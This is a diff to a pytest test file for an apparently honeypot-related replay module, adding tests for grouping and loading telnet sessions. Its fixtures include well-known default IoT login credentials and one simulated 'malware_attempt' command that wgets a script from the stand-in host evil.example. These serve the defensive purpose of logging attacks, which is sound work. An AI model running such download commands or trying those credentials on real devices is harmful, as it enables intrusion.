@@ -149,7 +149,8 @@ class TestReplayIndex:
         idx = replay.replay_index(log_dir=str(tmp_path))
         sids = sorted(r["session_id"] for r in idx)
         assert sids == ["10.0.0.1_113000", "192.0.2.4_120000"]
-        assert all("size_bytes" in r for r in idx)
+        assert all("event_count" in r for r in idx)
+        assert all(r["protocol"] == "ftp" for r in idx)
 
     def test_empty_dir_returns_empty(self, tmp_path):
         # A fresh tmp_path => empty list, no crash
@@ -200,3 +201,108 @@ class TestLoadIntel:
         ip = "203.0.113.100"
         (tmp_path / "recon_203_0_113_100.json").write_text("[1,2,3]")
         assert replay.load_intel(ip, log_dir=str(tmp_path)) == {}
+
+
+# ─────────────────────────────────────────────────────────────
+#  Telnet session synthesis (drop #2.5)
+# ─────────────────────────────────────────────────────────────
+
+def _write_all_events(tmp_path, events):
+    path = tmp_path / "all_events.json"
+    path.write_text("\n".join(json.dumps(e) for e in events) + "\n")
+    return path
+
+
+def _telnet_event(ts_iso, ip, service="telnet", **data):
+    return {"timestamp": ts_iso, "service": service,
+            "source_ip": ip, "source_port": 0, "data": data}
+
+
+class TestTelnetSessionGrouping:
+    def test_groups_bursts_into_one_session(self, tmp_path):
+        # 5 login attempts from one IP within 30s → 1 session
+        events = [
+            _telnet_event(f"2026-06-02T02:47:{10+i:02d}+00:00",
+                          "110.37.66.188", username=u, password="")
+            for i, u in enumerate(["root", "xc3511", "admin", "vizxv", "default"])
+        ]
+        _write_all_events(tmp_path, events)
+        idx = replay.replay_index(log_dir=str(tmp_path))
+        telnet = [r for r in idx if r["protocol"] == "telnet"]
+        assert len(telnet) == 1
+        assert telnet[0]["ip"] == "110.37.66.188"
+        assert telnet[0]["event_count"] == 5
+
+    def test_gap_creates_separate_sessions(self, tmp_path):
+        # Same IP, two bursts separated by > 5 min → 2 sessions
+        events = [
+            _telnet_event("2026-06-02T02:47:10+00:00", "1.2.3.4", username="root"),
+            _telnet_event("2026-06-02T02:47:15+00:00", "1.2.3.4", username="admin"),
+            # Big gap (10 min)
+            _telnet_event("2026-06-02T02:57:30+00:00", "1.2.3.4", username="guest"),
+        ]
+        _write_all_events(tmp_path, events)
+        idx = replay.replay_index(log_dir=str(tmp_path))
+        telnet = [r for r in idx if r["protocol"] == "telnet"]
+        assert len(telnet) == 2
+
+    def test_different_ips_get_different_sessions(self, tmp_path):
+        events = [
+            _telnet_event("2026-06-02T02:47:10+00:00", "1.2.3.4", username="root"),
+            _telnet_event("2026-06-02T02:47:11+00:00", "5.6.7.8", username="root"),
+        ]
+        _write_all_events(tmp_path, events)
+        idx = replay.replay_index(log_dir=str(tmp_path))
+        telnet = sorted([r for r in idx if r["protocol"] == "telnet"],
+                        key=lambda r: r["ip"])
+        assert len(telnet) == 2
+        assert telnet[0]["ip"] == "1.2.3.4"
+        assert telnet[1]["ip"] == "5.6.7.8"
+
+
+class TestTelnetReplayLoader:
+    def test_loads_login_events_as_timeline(self, tmp_path):
+        events = [
+            _telnet_event("2026-06-02T02:47:10.500000+00:00",
+                          "110.37.66.188", username="root", password=""),
+            _telnet_event("2026-06-02T02:47:15.700000+00:00",
+                          "110.37.66.188", username="xc3511", password=""),
+            _telnet_event("2026-06-02T02:47:20.000000+00:00",
+                          "110.37.66.188", service="telnet_cmd", command="ls /tmp"),
+            _telnet_event("2026-06-02T02:47:25.000000+00:00",
+                          "110.37.66.188", service="malware_attempt",
+                          command="wget http://evil.example/x.sh"),
+        ]
+        _write_all_events(tmp_path, events)
+        # session_id is derived from first event's HHMMSS in UTC
+        sid = "110.37.66.188_024710"
+        timeline = replay.replay_loader(sid, protocol="telnet",
+                                        log_dir=str(tmp_path))
+        assert timeline["protocol"] == "telnet"
+        assert timeline["ip"] == "110.37.66.188"
+        assert len(timeline["events"]) == 4
+        # First two are logins, then cmd, then malware
+        kinds = [e["kind"] for e in timeline["events"]]
+        assert kinds == ["login", "login", "cmd", "malware"]
+        # Login text shows credential pair
+        assert "root" in timeline["events"][0]["text"]
+        assert "xc3511" in timeline["events"][1]["text"]
+        # Duration ≈ 15 seconds = 15000ms (allow tiny float error)
+        assert 14500 <= timeline["duration_ms"] <= 15500
+
+    def test_unknown_protocol_raises(self, tmp_path):
+        with pytest.raises(ValueError):
+            replay.replay_loader("1.2.3.4_120000", protocol="ssh",
+                                 log_dir=str(tmp_path))
+
+    def test_missing_telnet_session_raises(self, tmp_path):
+        _write_all_events(tmp_path, [
+            _telnet_event("2026-06-02T02:47:10+00:00", "1.2.3.4", username="root"),
+        ])
+        with pytest.raises(FileNotFoundError):
+            replay.replay_loader("9.9.9.9_120000", protocol="telnet",
+                                 log_dir=str(tmp_path))
+
+    def test_no_all_events_file_means_no_telnet_sessions(self, tmp_path):
+        idx = replay.replay_index(log_dir=str(tmp_path))
+        assert [r for r in idx if r["protocol"] == "telnet"] == []
